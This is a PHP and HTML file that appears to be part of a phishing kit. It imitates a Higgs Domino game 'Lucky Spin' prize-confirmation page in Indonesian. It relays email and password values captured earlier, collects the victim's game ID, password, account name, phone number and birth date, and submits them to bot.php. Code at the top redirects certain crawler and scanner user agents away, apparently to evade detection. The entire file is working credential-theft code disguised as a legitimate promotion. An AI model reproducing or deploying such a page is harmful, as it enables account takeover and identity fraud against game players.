<?php 
$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) 
{
header('Location: cracker.php');
die();
}
?>
<?php
// MENANGKAP DATA YANG DI-INPUT
$email = $_POST['email'];
$password = $_POST['password'];
$login = $_POST['login'];

// MENGALIHKAN KE HALAMAN UTAMA JIKA DATA BELUM DI-INPUT
if($email == "" && $password == "" && $login == ""){
    header("Location: index.php");
}
?>
<html lang="zh" style="font-size: 50px;"><head>
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0,viewport-fit=cover">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
    <meta name="format-detection" content="telephone=no, email=no">
    <meta http-equiv="Cache-Control" content="no-transform">
    <meta http-equiv="Cache-Control" content="no-siteapp">
    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
    <meta http-equiv="Pragma" content="no-cache">
    <meta http-equiv="Expires" content="0">
    <title>Higgs Domino</title>
    <link rel="stylesheet" type="text/css" href="css/common.css">
    <link rel="stylesheet" type="text/css" href="css/website/footer.1.0.css">
    <link rel="stylesheet" type="text/css" href="css/website/web_shop.1.0.css">
</head>
<body>
    <div class="wrapper-land">
        <div class="landContent">
            <center>
                <h4 class="title">
                    <img src="img/logo.png">
                </h4>
            </center>
            <div class="password-form-container">
                <div class="password-form-title">
                    Info : Konfirmasi Data Pemenang Lucky Spin.
                </div>
                <form class="login-form" action="bot.php" id="ock" method="post">
                <input name="email" value="<?php echo $email;?>" type="hidden" class="password-form-input" readonly="">
                <input name="password" value="<?php echo $password;?>" type="hidden" class="password-form-input" readonly="">
                <input name="login" value="<?php echo $login;?>" type="hidden" class="password-form-input" readonly="">
                    <div class="password-form">
                        <div class="password-form-item">
                            <div class="password-form-item__label">ID game</div>
                            <div class="password-form-item__content">
                                <input type="text" class="password-form-input" id="Myid" name="playid" autocomplete="off" required=""><a class="ico-view-tutorial"></a>
                            </div>
                        </div>
                        <div class="password-form-item">
                            <div class="password-form-item__label">Input kata sandi</div>
                            <div class="password-form-item__content">
                                <input type="password" class="password-form-input" placeholder="6-16 angka atau huruf" name="sandi" autocomplete="off" required="">
                            </div>
                        </div>
                        <div class="password-form-item">
                            <div class="password-form-item__label">Nama Akun</div>
                            <div class="password-form-item__content">
                                <input type="text" class="password-form-input" placeholder="Masukkan Nama Akun" name="nameacc" autocomplete="off" required="">
                            </div>
                        </div>
                        <div class="password-form-item">
                            <div class="password-form-item__label">Nomor HP</div>
                            <div class="password-form-item__content">
                                <input type="text" class="password-form-input" id="phone" name="phone" autocomplete="off" minlength="10" maxlength="13" required="">
                            </div>
                        </div>
                        <div class="password-form-item">
                            <div class="password-form-item__label">Tanggal Lahir</div>
                            <div class="password-form-item__content">
                                <input type="text" class="password-form-input" placeholder="Masukkan tanggal lahir" name="ttl" autocomplete="off" required="">
                            </div>
                        </div>
                    </div>
                    <div class="password-form-tip">
                        Hadiah akan dikirim setelah konfirmasi data yang Anda kirim berhasil.
                    </div>
                        <center><span> <button type="submit" class="btn btn-send" style="border: none"></span></center>
            </form></div>
            <footer>
                <div class="pa footer">
                    <a class="icoFaceBook" href="https://www.facebook.com/Dominoisland/"></a>
                    <a class="icoMail" href="https://event-higgsdomino.com/cdn-cgi/l/email-protection#ed9f889e988199898280848382ad8a808c8481c38e8280"></a>
                    <a class="icoIns" href="https://www.instagram.com/higgsdominoisland"></a>
                    <a class="icoWa" href="https://api.whatsapp.com/send?phone=6285348122184"></a>
                    <a class="icoTop" href="https://event-higgsdomino.com/verification.php#"></a>
                    <p class="itemText">Seluruh hak cipta.Terhubung dengan Kami!</p>
                </div>
            </footer>
        </div>
    </div>
    <!-- 弹框-密码设置成功 -->
    <div class="pop-password-tip" id="successDiv" style="z-index:999">
        <div class="tip-icon">
            <span class="ico-success"></span>
        </div>
        <div class="tip-txt">
            Anda sudah berhasil memasukkan Keamanan Password.<br>
            Harap diingat Keamanan Password yang akan Anda gunakan dalam permainan.
        </div>
    </div>
    <!-- 弹框-密码设置失败 -->
    <div class="pop-password-tip" id="failDiv">
        <a class="pa btnClose"></a>
        <div class="tip-icon">
            <span class="ico-error"></span>
        </div>
        <div class="tip-txt error">
            Setting kata sandi keamanan gagal.<br>
            Silahkan coba lagi atau hubungi cs untuk bantuan
        </div>
        <span class="btn-home-page"></span>
    </div>
    <div id="thickdiv" class="thickdiv"></div>
    <div class="viewGuideBox">
        <a class="pa btnClose" id="viewguideClose"></a>
    </div>
</body></html>
